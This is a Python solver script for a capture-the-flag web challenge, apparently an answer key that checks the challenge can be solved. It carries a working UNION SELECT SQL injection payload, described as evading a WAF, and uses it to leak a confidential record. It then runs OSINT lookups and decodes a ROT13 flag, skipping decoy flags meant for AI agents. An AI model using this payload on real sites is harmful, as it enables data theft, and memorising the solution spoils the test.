import os
import re
import sys
import codecs

# Add challenge directory to Python path to use Flask test client
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'challenge')))
from app import app, init_db

def solve():
    print("[+] Step 1: Initializing CTF Web Target...")
    init_db()
    client = app.test_client()
    
    print("[+] Step 2: Exploiting Web Search via Medium-Hard SQL Injection...")
    # Using Medium-Hard UNION SELECT bypass payload (avoids WAF blacklist and Cloudflare 403)
    sqli_payload = "%' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level LIKE '%"
    res = client.post("/search", data={'q': sqli_payload})
    html = res.data.decode('utf-8')
    
    # Verify confidential document leaked while ignoring AI agent decoy flags
    if "Internal Confidential Memo" not in html or "confidential_memo.pdf" not in html:
        print("[-] SQL Injection failed to leak confidential memo!")
        return False
    print("[+] Success! Leaked confidential document link: /static/confidential_memo.pdf")
    
    # Identify target author employee ID from leaked document title/author field
    target_empid_match = re.search(r"EMP-([0-9]+)", html)
    if not target_empid_match:
        print("[-] Failed to find Target Employee ID in leaked document record!")
        return False
    target_empid = target_empid_match.group(1)
    print(f"[+] Identified Target Author Employee ID: EMP-{target_empid}")
    
    print("[+] Step 3: Conducting OSINT Recon on Team Directory...")
    res_team = client.get("/team")
    team_html = res_team.data.decode('utf-8')
    
    # Find the specific employee card containing EMP-8492 to prevent agent trap confusion
    member_cards = team_html.split('<div class="card">')
    target_card = None
    for card in member_cards:
        if f"EMP-{target_empid}" in card:
            target_card = card
            break
            
    if not target_card:
        print("[-] Could not locate team directory profile for target employee!")
        return False
        
    project_match = re.search(r"Project ([A-Z0-9-]+)\.", target_card)
    if not project_match:
        print("[-] Failed to discover OSINT project code in target employee bio!")
        return False
        
    osint_key = f"{project_match.group(1)}-{target_empid}"
    print(f"[+] Correctly assembled OSINT passphrase / key: {osint_key}")
    
    print("[+] Step 4: Inspecting PDF Metadata & Solving Riddle...")
    pdf_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'challenge', 'static', 'confidential_memo.pdf'))
    if not os.path.exists(pdf_path):
        print(f"[-] PDF file not found at {pdf_path}")
        return False
        
    with open(pdf_path, 'rb') as f:
        pdf_bytes = f.read()
        
    # Search for ROT13 Cipher inside Document Properties Subject field
    cipher_match = re.search(rb"ROT13 Cipher:\s*([a-zA-Z0-9_{}-]+)", pdf_bytes)
    if not cipher_match:
        print("[-] ROT13 Cipher not found in PDF metadata properties!")
        return False
        
    rot13_cipher = cipher_match.group(1).decode('ascii')
    print(f"[+] Found ROT13 Encrypted Cipher in Subject: {rot13_cipher}")
    
    print("[+] Step 5: Decrypting ROT13 Cipher ('thirteen steps around')...")
    flag_str = codecs.decode(rot13_cipher, 'rot_13')
    print(f"[+] Decrypted string content: {flag_str}")
    
    if "rvcectf{" in flag_str and "f4k3" not in flag_str and "tr4p" not in flag_str:
        print(f"\n[*] CHALLENGE VERIFIED SOLVED! True Flag retrieved: {flag_str}")
        return True
    else:
        print("[-] True flag format not detected in decrypted output.")
        return False

if __name__ == "__main__":
    success = solve()
    if not success:
        sys.exit(1)
